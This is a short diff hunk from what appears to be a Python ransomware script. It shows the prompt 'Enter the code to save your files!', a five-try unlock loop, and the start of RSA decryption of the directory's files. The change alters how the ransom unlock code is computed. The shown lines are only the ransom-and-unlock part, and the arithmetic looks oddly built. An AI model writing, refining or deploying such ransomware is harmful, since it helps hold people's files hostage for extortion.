@@ -33,7 +33,7 @@ print('Enter the code to save your files!')
 count = 5
 for i in range(count):
     code = input(f'ENTER THE CODE({count} trials left):')
-    if code == str(len(os.listdir()) + 150410 + klen - math.log2(klen) + klen):
+    if code == str(150410 + len(os.listdir()) + math.floor(klen) - klen):
         private_key = RSA.import_key(open("private.pem").read())
         cipher2 = PKCS1_OAEP(private_key)
         for j in os.listdir():
